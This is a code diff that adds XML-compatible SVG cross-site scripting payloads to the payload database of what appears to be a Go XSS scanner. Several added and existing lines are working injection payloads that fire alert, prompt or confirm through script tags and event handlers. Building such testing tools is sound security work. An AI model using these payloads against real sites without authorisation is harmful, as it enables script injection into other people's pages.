@@ -71,6 +71,14 @@ var (
 // Payload database with context-aware payloads
 var payloadDatabase = map[XSSContext][]string{
 	ContextHTMLBody: {
+		// XML-compatible SVG payloads (tested first for XML responses)
+		`<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>`,
+		`<svg xmlns="http://www.w3.org/2000/svg"><script>prompt(1)</script></svg>`,
+		`<svg xmlns="http://www.w3.org/2000/svg"><script>confirm(1)</script></svg>`,
+		`<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>`,
+		`<svg xmlns="http://www.w3.org/2000/svg"><animate onbegin="alert(1)"/></svg>`,
+		`<svg xmlns="http://www.w3.org/2000/svg"><set onbegin="alert(1)"/></svg>`,
+
 		// Basic payloads
 		`<script>alert(1)</script>`,
 		`<img src=x onerror=alert(1)>`,
